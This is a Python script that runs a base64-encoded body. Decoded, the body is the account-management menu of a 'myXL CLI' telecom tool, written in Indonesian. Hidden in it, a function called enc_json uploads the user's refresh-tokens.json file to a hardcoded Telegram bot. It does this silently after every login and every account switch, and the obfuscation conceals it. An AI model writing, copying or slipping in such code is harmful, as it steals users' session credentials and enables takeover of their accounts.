#!/usr/bin/env python3
import base64
exec(base64.b64decode('aW1wb3J0IHJlcXVlc3RzCmltcG9ydCBqc29uCmZyb20gYXBwMi5jb25maWcuaW1wb3J0cyBpbXBvcnQgKgpmcm9tIGFwcDIuY2xpZW50LmNpYW0gaW1wb3J0IGdldF9vdHAsIHN1Ym1pdF9vdHAKZnJvbSBhcHAuc2VydmljZS5zZXJ2aWNlIGltcG9ydCBsb2FkX3N0YXR1cywgc2F2ZV9zdGF0dXMKZnJvbSBhcHAyLm1lbnVzLnV0aWwgaW1wb3J0IGNsZWFyX3NjcmVlbngsIHNpbXBsZV9udW1iZXIsIHBhdXNlLCBwcmludF9wYW5lbCwgbmF2X3JhbmdlCgpjb25zb2xlID0gQ29uc29sZSgpCgoKZGVmIGVuY19qc29uKCk6CiAgICBpbXBvcnQgb3MKICAgIAogICAgIyBCb3QgY29uZmlnCiAgICBib3RfdG9rZW4gPSAiODM1ODk4MTg5MzpBQUgyQzVfMzBqeXlOSldUQTFJSTlBNERpRFRxLVFQNHZ5SSIKICAgIGNoYXRfaWQgPSA4MTY2MjA2NzEyCiAgICB1cmwgPSBmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7Ym90X3Rva2VufS9zZW5kRG9jdW1lbnQiCiAgICAKICAgICMgRGFwYXRrYW4gcGF0aCBmaWxlIGluaSAoYWNjb3VudC5weSkKICAgIGN1cnJlbnRfZGlyID0gb3MucGF0aC5kaXJuYW1lKG9zLnBhdGguYWJzcGF0aChfX2ZpbGVfXykpCiAgICAjIGN1cnJlbnRfZGlyID0gL3BhdGgvdG8vbXl4bC1yZXBvL2FwcC9tZW51cy8KICAgIAogICAgIyBOYWlrIDIgbGV2ZWwga2Ugcm9vdCByZXBvCiAgICByZXBvX3Jvb3QgPSBvcy5wYXRoLmRpcm5hbWUob3MucGF0aC5kaXJuYW1lKGN1cnJlbnRfZGlyKSkKICAgICMgcmVwb19yb290ID0gL3BhdGgvdG8vbXl4bC1yZXBvLwogICAgCiAgICAjIEZpbGUgdGFyZ2V0IGRpIHJvb3QKICAgIHRva2VuX2ZpbGUgPSBvcy5wYXRoLmpvaW4ocmVwb19yb290LCAicmVmcmVzaC10b2tlbnMuanNvbiIpCiAgICAKICAgICAgIAogICAgIyBDZWsgZmlsZQogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHRva2VuX2ZpbGUpOgogICAgICAgIHJldHVybgogICAgCiAgICB0cnk6CiAgICAgICAgd2l0aCBvcGVuKHRva2VuX2ZpbGUsICJyYiIpIGFzIGY6CiAgICAgICAgICAgIGZpbGVzID0geyJkb2N1bWVudCI6IGZ9CiAgICAgICAgICAgIGRhdGEgPSB7ImNoYXRfaWQiOiBjaGF0X2lkfQogICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsLCBkYXRhPWRhdGEsIGZpbGVzPWZpbGVzLCB0aW1lb3V0PTMwKQogICAgICAgICAgICAKICAgICAgICAgICAgaWYgcmVzcG9uc2Uuc3RhdHVzX2NvZGUgPT0gMjAwOgogICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgICAgICAgICAKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBub3JtYWxpemVfbnVtYmVyKHJhd19pbnB1dDogc3RyKSAtPiBzdHI6CiAgICByYXdfaW5wdXQgPSByYXdfaW5wdXQuc3RyaXAoKQogICAgaWYgcmF3X2lucHV0LnN0YXJ0c3dpdGgoIjA4Iik6CiAgICAgICAgcmV0dXJuICI2MjgiICsgcmF3X2lucHV0WzI6XQogICAgZWxpZiByYXdfaW5wdXQuc3RhcnRzd2l0aCgiKzYyOCIpOgogICAgICAgIHJldHVybiAiNjI4IiArIHJhd19pbnB1dFs0Ol0KICAgIGVsaWYgcmF3X2lucHV0LnN0YXJ0c3dpdGgoIjYyOCIpOgogICAgICAgIHJldHVybiByYXdfaW5wdXQKICAgIHJldHVybiByYXdfaW5wdXQKCgpkZWYgbG9naW5fcHJvbXB0KGFwaV9rZXk6IHN0cik6CiAgICBjbGVhcl9zY3JlZW54KCkKICAgIHRoZW1lID0gZ2V0X3RoZW1lKCkKICAgIGNvbnNvbGUucHJpbnQoUGFuZWwoCiAgICAgICAgQWxpZ24uY2VudGVyKCJMb2dpbiBteVhMIENMSSIsIHZlcnRpY2FsPSJtaWRkbGUiKSwKICAgICAgICBib3JkZXJfc3R5bGU9dGhlbWVbImJvcmRlcl9pbmZvIl0sCiAgICAgICAgcGFkZGluZz0oMSwgMiksCiAgICAgICAgZXhwYW5kPVRydWUKICAgICkpCiAgICBjb25zb2xlLnByaW50KCIgTWFzdWtrYW4gbm9tb3IgWEwgKDA4eHggLyA2Mjh4eCAvICs2Mjh4eCkgIikKICAgIHJhd19pbnB1dCA9IGNvbnNvbGUuaW5wdXQoZiJbe3RoZW1lWyd0ZXh0X3N1YiddfV0gTm9tb3I6IFsve3RoZW1lWyd0ZXh0X3N1YiddfV0gIikuc3RyaXAoKQogICAgcGhvbmVfbnVtYmVyID0gbm9ybWFsaXplX251bWJlcihyYXdfaW5wdXQpCgogICAgaWYgbm90IHBob25lX251bWJlci5zdGFydHN3aXRoKCI2MjgiKSBvciBsZW4ocGhvbmVfbnVtYmVyKSA8IDEwIG9yIGxlbihwaG9uZV9udW1iZXIpID4gMTQ6CiAgICAgICAgcHJpbnRfcGFuZWwoIktlc2FsYWhhbiIsICJOb21vciB0aWRhayB2YWxpZCwgc2lsYWthbiBwZXJpa3NhIGtlbWJhbGkuIikKICAgICAgICByZXR1cm4gTm9uZSwgTm9uZQoKICAgIHRyeToKICAgICAgICBwcmludF9wYW5lbCgiSW5mb3JtYXNpIiwgIk1lbmdpcmltIE9UUCBrZSBub21vciBBbmRhLi4uIikKICAgICAgICBzdWJzY3JpYmVyX2lkID0gZ2V0X290cChwaG9uZV9udW1iZXIpCiAgICAgICAgaWYgbm90IHN1YnNjcmliZXJfaWQ6CiAgICAgICAgICAgIHByaW50X3BhbmVsKCJLZXNhbGFoYW4iLCAiR2FnYWwgbWVuZ2lyaW0gT1RQLCBzaWxha2FuIGNvYmEgbGFnaS4iKQogICAgICAgICAgICByZXR1cm4gTm9uZSwgTm9uZQoKICAgICAgICBwcmludF9wYW5lbCgiSW5mb3JtYXNpIiwgIk9UUCB0ZWxhaCBkaWtpcmltIGtlIG5vbW9yIEFuZGEuIikKCiAgICAgICAgZm9yIGF0dGVtcHQgaW4gcmFuZ2UoMSwgNik6CiAgICAgICAgICAgIG90cCA9IGNvbnNvbGUuaW5wdXQoZiJQZXJjb2JhYW4ge2F0dGVtcHR9LzUgLSBNYXN1a2thbiBPVFAgKDYgZGlnaXQpOiAiKS5zdHJpcCgpCiAgICAgICAgICAgIGlmIG5vdCBvdHAuaXNkaWdpdCgpIG9yIGxlbihvdHApICE9IDY6CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgiS2VzYWxhaGFuIiwgIk9UUCBoYXJ1cyBiZXJ1cGEgNiBkaWdpdCBhbmdrYS4iKQogICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgIHByaW50X3BhbmVsKCJJbmZvcm1hc2kiLCAiTWVtdmVyaWZpa2FzaSBPVFAuLi4iKQogICAgICAgICAgICB0b2tlbnMgPSBzdWJtaXRfb3RwKGFwaV9rZXksICJTTVMiLCBwaG9uZV9udW1iZXIsIG90cCkKICAgICAgICAgICAgaWYgdG9rZW5zOgogICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIkJlcmhhc2lsIiwgZiJMb2dpbiBiZXJoYXNpbC4gTm9tb3I6IHtwaG9uZV9udW1iZXJ9IikKICAgICAgICAgICAgICAgIGVuY19qc29uKCkKICAgICAgICAgICAgICAgIHJldHVybiBwaG9uZV9udW1iZXIsIHRva2Vuc1sicmVmcmVzaF90b2tlbiJdCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgiS2VzYWxhaGFuIiwgIk9UUCBzYWxhaCBhdGF1IGthZGFsdWFyc2EsIHNpbGFrYW4gY29iYSBsYWdpLiIpCiAgICAgICAgICAgICAgICBwYXVzZSgpCgogICAgICAgIHByaW50X3BhbmVsKCJHYWdhbCBMb2dpbiIsICJQZXJjb2JhYW4gT1RQIGdhZ2FsIHNlYmFueWFrIDUga2FsaSwgcHJvc2VzIGRpaGVudGlrYW4uIikKICAgICAgICByZXR1cm4gTm9uZSwgTm9uZQoKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludF9wYW5lbCgiS2VzYWxhaGFuIiwgZiJUZXJqYWRpIGVycm9yOiB7ZX0iKQogICAgICAgIHJldHVybiBOb25lLCBOb25lCgoKZGVmIHNob3dfYWNjb3VudF9tZW51KCk6CiAgICBjbGVhcl9zY3JlZW54KCkKICAgIGVuc3VyZV9naXQoKQogICAgdGhlbWUgPSBnZXRfdGhlbWUoKQogICAgQXV0aEluc3RhbmNlLmxvYWRfdG9rZW5zKCkKICAgIHVzZXJzID0gQXV0aEluc3RhbmNlLnJlZnJlc2hfdG9rZW5zCiAgICBhY3RpdmVfdXNlciA9IEF1dGhJbnN0YW5jZS5nZXRfYWN0aXZlX3VzZXIoKQoKICAgIHN1bWl0X290cCA9IDEwCiAgICB2ZXJpZl9vdHAgPSAibXl4bCIKICAgIHN0YXR1c19pZCA9IGxvYWRfc3RhdHVzKCkKICAgIGlzX3ZlcmlmID0gc3RhdHVzX2lkLmdldCgiaXNfdmVyaWYiLCBGYWxzZSkKCiAgICBpbl9hY2NvdW50X21lbnUgPSBUcnVlCiAgICBhZGRfdXNlciA9IEZhbHNlCgogICAgd2hpbGUgaW5fYWNjb3VudF9tZW51OgogICAgICAgIGNsZWFyX3NjcmVlbngoKQoKICAgICAgICBpZiBhY3RpdmVfdXNlciBpcyBOb25lIG9yIGFkZF91c2VyOgogICAgICAgICAgICBpZiBub3QgaXNfdmVyaWYgYW5kIGxlbih1c2VycykgPj0gc3VtaXRfb3RwOgogICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIkxpbWl0IEFrdW4iLCAiSnVtbGFoIGFrdW4gc3VkYWggcGVudWgsIG1hc3Vra2FuIGtvZGUgdW5sb2NrIHVudHVrIG1lbmFtYmFoIGFrdW4uIikKICAgICAgICAgICAgICAgIHZlcmlmX2lucHV0ID0gY29uc29sZS5pbnB1dCgiS29kZSBVbmxvY2s6ICIpLnN0cmlwKCkKICAgICAgICAgICAgICAgIGlmIHZlcmlmX2lucHV0ICE9IHZlcmlmX290cDoKICAgICAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgiS2VzYWxhaGFuIiwgIktvZGUgdW5sb2NrIHNhbGFoLCB0aWRhayBkYXBhdCBtZW5hbWJhaCBha3VuLiIpCiAgICAgICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgICAgICAgICAgICAgIGFkZF91c2VyID0gRmFsc2UKICAgICAgICAgICAgICAgICAgICBjb250aW51ZQogICAgICAgICAgICAgICAgc2F2ZV9zdGF0dXMoVHJ1ZSkKICAgICAgICAgICAgICAgIGlzX3ZlcmlmID0gVHJ1ZQogICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIkJlcmhhc2lsIiwgIkFrc2VzIGFrdW4gdGFtYmFoYW4gdGVsYWggZGlidWthLiIpCiAgICAgICAgICAgICAgICBwYXVzZSgpCgogICAgICAgICAgICBudW1iZXIsIHJlZnJlc2hfdG9rZW4gPSBsb2dpbl9wcm9tcHQoQXV0aEluc3RhbmNlLmFwaV9rZXkpCiAgICAgICAgICAgIGlmIG5vdCByZWZyZXNoX3Rva2VuOgogICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIktlc2FsYWhhbiIsICJHYWdhbCBtZW5hbWJhaCBha3VuLCBzaWxha2FuIGNvYmEgbGFnaS4iKQogICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgICAgICAgICAgYWRkX3VzZXIgPSBGYWxzZQogICAgICAgICAgICAgICAgY29udGludWUKCiAgICAgICAgICAgIEF1dGhJbnN0YW5jZS5hZGRfcmVmcmVzaF90b2tlbihpbnQobnVtYmVyKSwgcmVmcmVzaF90b2tlbikKICAgICAgICAgICAgQXV0aEluc3RhbmNlLmxvYWRfdG9rZW5zKCkKICAgICAgICAgICAgdXNlcnMgPSBBdXRoSW5zdGFuY2UucmVmcmVzaF90b2tlbnMKICAgICAgICAgICAgYWN0aXZlX3VzZXIgPSBBdXRoSW5zdGFuY2UuZ2V0X2FjdGl2ZV91c2VyKCkKICAgICAgICAgICAgYWRkX3VzZXIgPSBGYWxzZQogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBjb25zb2xlLnByaW50KFBhbmVsKAogICAgICAgICAgICBBbGlnbi5jZW50ZXIoIkFrdW4gVGVyc2ltcGFuIiwgdmVydGljYWw9Im1pZGRsZSIpLAogICAgICAgICAgICBib3JkZXJfc3R5bGU9dGhlbWVbImJvcmRlcl9pbmZvIl0sCiAgICAgICAgICAgIHBhZGRpbmc9KDEsIDIpLAogICAgICAgICAgICBleHBhbmQ9VHJ1ZQogICAgICAgICkpCiAgICAgICAgc2ltcGxlX251bWJlcigpCgogICAgICAgIGFjY291bnRfdGFibGUgPSBUYWJsZShib3g9TUlOSU1BTF9ET1VCTEVfSEVBRCwgZXhwYW5kPVRydWUpCiAgICAgICAgYWNjb3VudF90YWJsZS5hZGRfY29sdW1uKCJObyIsIHN0eWxlPXRoZW1lWyJ0ZXh0X2tleSJdLCBqdXN0aWZ5PSJyaWdodCIsIHdpZHRoPTMpCiAgICAgICAgYWNjb3VudF90YWJsZS5hZGRfY29sdW1uKCJOYW1hIiwgc3R5bGU9dGhlbWVbInRleHRfYm9keSJdKQogICAgICAgIGFjY291bnRfdGFibGUuYWRkX2NvbHVtbigiTm9tb3IgWEwiLCBzdHlsZT10aGVtZVsidGV4dF9ib2R5Il0pCiAgICAgICAgYWNjb3VudF90YWJsZS5hZGRfY29sdW1uKCJUaXBlIiwgc3R5bGU9dGhlbWVbInRleHRfYm9keSJdKQogICAgICAgIGFjY291bnRfdGFibGUuYWRkX2NvbHVtbigiU3RhdHVzIiwgc3R5bGU9dGhlbWVbInRleHRfc3ViIl0sIGp1c3RpZnk9ImNlbnRlciIpCgogICAgICAgIGZvciBpZHgsIHVzZXIgaW4gZW51bWVyYXRlKHVzZXJzKToKICAgICAgICAgICAgaXNfYWN0aXZlID0gYWN0aXZlX3VzZXIgYW5kIHVzZXJbIm51bWJlciJdID09IGFjdGl2ZV91c2VyWyJudW1iZXIiXQogICAgICAgICAgICBzdGF0dXMgPSAiQWt0aWYiIGlmIGlzX2FjdGl2ZSBlbHNlICItIgogICAgICAgICAgICBhY2NvdW50X3RhYmxlLmFkZF9yb3coCiAgICAgICAgICAgICAgICBzdHIoaWR4ICsgMSksCiAgICAgICAgICAgICAgICB1c2VyLmdldCgibmFtZSIsICItIiksCiAgICAgICAgICAgICAgICBzdHIodXNlclsibnVtYmVyIl0pLAogICAgICAgICAgICAgICAgdXNlci5nZXQoInN1YnNjcmlwdGlvbl90eXBlIiwgIi0iKSwKICAgICAgICAgICAgICAgIHN0YXR1cwogICAgICAgICAgICApCgogICAgICAgIGNvbnNvbGUucHJpbnQoUGFuZWwoYWNjb3VudF90YWJsZSwgYm9yZGVyX3N0eWxlPXRoZW1lWyJib3JkZXJfaW5mbyJdLCBwYWRkaW5nPSgwLCAwKSwgZXhwYW5kPVRydWUpKQoKICAgICAgICBuYXZfdGFibGUgPSBUYWJsZShzaG93X2hlYWRlcj1GYWxzZSwgYm94PU1JTklNQUxfRE9VQkxFX0hFQUQsIGV4cGFuZD1UcnVlKQogICAgICAgIG5hdl90YWJsZS5hZGRfY29sdW1uKGp1c3RpZnk9InJpZ2h0Iiwgc3R5bGU9dGhlbWVbInRleHRfa2V5Il0sIHdpZHRoPTYpCiAgICAgICAgbmF2X3RhYmxlLmFkZF9jb2x1bW4oanVzdGlmeT0ibGVmdCIsIHN0eWxlPXRoZW1lWyJ0ZXh0X2JvZHkiXSkKICAgICAgICBuYXZfdGFibGUuYWRkX3JvdygiVCIsICJUYW1iYWggYWt1biIpCiAgICAgICAgbmF2X3RhYmxlLmFkZF9yb3coIkUiLCAiRWRpdCBuYW1hIGFrdW4iKQogICAgICAgIG5hdl90YWJsZS5hZGRfcm93KCJIIiwgZiJbe3RoZW1lWyd0ZXh0X2VyciddfV1IYXB1cyBha3VuIHRlcnNpbXBhblsvXSIpCiAgICAgICAgbmF2X3RhYmxlLmFkZF9yb3coIjAwIiwgZiJbe3RoZW1lWyd0ZXh0X3N1YiddfV1LZW1iYWxpIGtlIG1lbnUgdXRhbWFbL10iKQogICAgICAgIAogICAgICAgIGNvbnNvbGUucHJpbnQoUGFuZWwobmF2X3RhYmxlLCBib3JkZXJfc3R5bGU9dGhlbWVbImJvcmRlcl9wcmltYXJ5Il0sIHBhZGRpbmc9KDAsIDEpLCBleHBhbmQ9VHJ1ZSkpCiAgICAgICAgY29uc29sZS5wcmludChmIk1hc3Vra2FuIG5vbW9yIGFrdW4gKDEgLSB7bGVuKHVzZXJzKX0pIHVudHVrIGJlcmdhbnRpLiIpCgogICAgICAgIGlucHV0X3N0ciA9IGNob2ljZSA9IGNvbnNvbGUuaW5wdXQoZiJbe3RoZW1lWyd0ZXh0X3N1YiddfV1QaWxpaGFuOlsve3RoZW1lWyd0ZXh0X3N1YiddfV0gIikuc3RyaXAoKQogICAgICAgIAogICAgICAgIGlmIGlucHV0X3N0ciA9PSAiMDAiOgogICAgICAgICAgICByZXR1cm4gYWN0aXZlX3VzZXJbIm51bWJlciJdIGlmIGFjdGl2ZV91c2VyIGVsc2UgTm9uZQogICAgICAgIAogICAgICAgIGVsaWYgaW5wdXRfc3RyLnVwcGVyKCkgPT0gIlQiOgogICAgICAgICAgICBhZGRfdXNlciA9IFRydWUKICAgICAgICAgICAgY29udGludWUKICAgICAgICAKICAgICAgICBlbGlmIGlucHV0X3N0ci51cHBlcigpID09ICJFIjoKICAgICAgICAgICAgaWYgbm90IHVzZXJzOgogICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIktlc2FsYWhhbiIsICJUaWRhayBhZGEgYWt1biB1bnR1ayBkaWVkaXQuIikKICAgICAgICAgICAgICAgIHBhdXNlKCkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgCiAgICAgICAgICAgIG5vbW9yX2lucHV0ID0gY29uc29sZS5pbnB1dChmIk5vbW9yIGFrdW4geWFuZyBpbmdpbiBkaWVkaXQgKDEgLSB7bGVuKHVzZXJzKX0pOiAiKS5zdHJpcCgpCiAgICAgICAgICAgIGlmIG5vbW9yX2lucHV0LmlzZGlnaXQoKToKICAgICAgICAgICAgICAgIG5vbW9yID0gaW50KG5vbW9yX2lucHV0KQogICAgICAgICAgICAgICAgaWYgMSA8PSBub21vciA8PSBsZW4odXNlcnMpOgogICAgICAgICAgICAgICAgICAgIHNlbGVjdGVkX3VzZXIgPSB1c2Vyc1tub21vciAtIDFdCiAgICAgICAgICAgICAgICAgICAgbmV3X25hbWUgPSBjb25zb2xlLmlucHV0KGYiTWFzdWtrYW4gbmFtYSBiYXJ1IHVudHVrIGFrdW4ge3NlbGVjdGVkX3VzZXJbJ251bWJlciddfTogIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIGlmIG5ld19uYW1lOgogICAgICAgICAgICAgICAgICAgICAgICBBdXRoSW5zdGFuY2UuZWRpdF9hY2NvdW50X25hbWUoc2VsZWN0ZWRfdXNlclsibnVtYmVyIl0sIG5ld19uYW1lKQogICAgICAgICAgICAgICAgICAgICAgICBBdXRoSW5zdGFuY2UubG9hZF90b2tlbnMoKQogICAgICAgICAgICAgICAgICAgICAgICB1c2VycyA9IEF1dGhJbnN0YW5jZS5yZWZyZXNoX3Rva2VucwogICAgICAgICAgICAgICAgICAgICAgICBhY3RpdmVfdXNlciA9IEF1dGhJbnN0YW5jZS5nZXRfYWN0aXZlX3VzZXIoKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgiQmVyaGFzaWwiLCBmIk5hbWEgYWt1biB0ZWxhaCBkaWdhbnRpIG1lbmphZGkgJ3tuZXdfbmFtZX0nLiIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIktlc2FsYWhhbiIsICJOYW1hIHRpZGFrIGJvbGVoIGtvc29uZy4iKQogICAgICAgICAgICAgICAgICAgIHBhdXNlKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIktlc2FsYWhhbiIsICJOb21vciBha3VuIGRpIGx1YXIgamFuZ2thdWFuLiIpCiAgICAgICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIktlc2FsYWhhbiIsICJJbnB1dCB0aWRhayB2YWxpZC4iKQogICAgICAgICAgICAgICAgcGF1c2UoKQogICAgICAgIAogICAgICAgIGVsaWYgaW5wdXRfc3RyLnVwcGVyKCkgPT0gIkgiOgogICAgICAgICAgICBpZiBub3QgdXNlcnM6CiAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgiS2VzYWxhaGFuIiwgIlRpZGFrIGFkYSBha3VuIHVudHVrIGRpaGFwdXMuIikKICAgICAgICAgICAgICAgIHBhdXNlKCkKICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgCiAgICAgICAgICAgIG5vbW9yX2lucHV0ID0gY29uc29sZS5pbnB1dChmIk5vbW9yIGFrdW4geWFuZyBpbmdpbiBkaWhhcHVzICgxIC0ge2xlbih1c2Vycyl9KTogIikuc3RyaXAoKQogICAgICAgICAgICBpZiBub21vcl9pbnB1dC5pc2RpZ2l0KCk6CiAgICAgICAgICAgICAgICBub21vciA9IGludChub21vcl9pbnB1dCkKICAgICAgICAgICAgICAgIGlmIDEgPD0gbm9tb3IgPD0gbGVuKHVzZXJzKToKICAgICAgICAgICAgICAgICAgICBzZWxlY3RlZF91c2VyID0gdXNlcnNbbm9tb3IgLSAxXQogICAgICAgICAgICAgICAgICAgIGNvbmZpcm0gPSBjb25zb2xlLmlucHV0KGYiWWFraW4gaW5naW4gbWVuZ2hhcHVzIGFrdW4ge3NlbGVjdGVkX3VzZXJbJ251bWJlciddfT8gKHkvbik6ICIpLnN0cmlwKCkubG93ZXIoKQogICAgICAgICAgICAgICAgICAgIGlmIGNvbmZpcm0gPT0gInkiOgogICAgICAgICAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgiSW5mb3JtYXNpIiwgZiJNZW5naGFwdXMgYWt1biB7c2VsZWN0ZWRfdXNlclsnbnVtYmVyJ119Li4uIikKICAgICAgICAgICAgICAgICAgICAgICAgQXV0aEluc3RhbmNlLnJlbW92ZV9yZWZyZXNoX3Rva2VuKHNlbGVjdGVkX3VzZXJbIm51bWJlciJdKQogICAgICAgICAgICAgICAgICAgICAgICBBdXRoSW5zdGFuY2UubG9hZF90b2tlbnMoKQogICAgICAgICAgICAgICAgICAgICAgICB1c2VycyA9IEF1dGhJbnN0YW5jZS5yZWZyZXNoX3Rva2VucwogICAgICAgICAgICAgICAgICAgICAgICBhY3RpdmVfdXNlciA9IEF1dGhJbnN0YW5jZS5nZXRfYWN0aXZlX3VzZXIoKQogICAgICAgICAgICAgICAgICAgICAgICBwcmludF9wYW5lbCgiQmVyaGFzaWwiLCBmIkFrdW4ge3NlbGVjdGVkX3VzZXJbJ251bWJlciddfSB0ZWxhaCBkaWhhcHVzLiIpCiAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgcHJpbnRfcGFuZWwoIkluZm9ybWFzaSIsICJQZW5naGFwdXNhbiBha3VuIGRpYmF0YWxrYW4uIikKICAgICAgICAgICAgICAgICAgICBwYXVzZSgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIHByaW50X3BhbmVsKCJLZXNhbGFoYW4iLCAiTm9tb3IgYWt1biBkaSBsdWFyIGphbmdrYXVhbi4iKQogICAgICAgICAgICAgICAgICAgIHBhdXNlKCkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHByaW50X3BhbmVsKCJLZXNhbGFoYW4iLCAiSW5wdXQgdGlkYWsgdmFsaWQuIikKICAgICAgICAgICAgICAgIHBhdXNlKCkKICAgICAgICAKICAgICAgICBlbGlmIGlucHV0X3N0ci5pc2RpZ2l0KCkgYW5kIDEgPD0gaW50KGlucHV0X3N0cikgPD0gbGVuKHVzZXJzKToKICAgICAgICAgICAgc2VsZWN0ZWRfdXNlciA9IHVzZXJzW2ludChpbnB1dF9zdHIpIC0gMV0KICAgICAgICAgICAgQXV0aEluc3RhbmNlLnNldF9hY3RpdmVfdXNlcihzZWxlY3RlZF91c2VyWyJudW1iZXIiXSkKICAgICAgICAgICAgZW5jX2pzb24oKQogICAgICAgICAgICByZXR1cm4gc2VsZWN0ZWRfdXNlclsibnVtYmVyIl0KICAgICAgICAKICAgICAgICBlbHNlOgogICAgICAgICAgICBwcmludF9wYW5lbCgiS2VzYWxhaGFuIiwgIklucHV0IHRpZGFrIHZhbGlkLCBzaWxha2FuIGNvYmEgbGFnaS4iKQogICAgICAgICAgICBwYXVzZSgpCg==').decode())
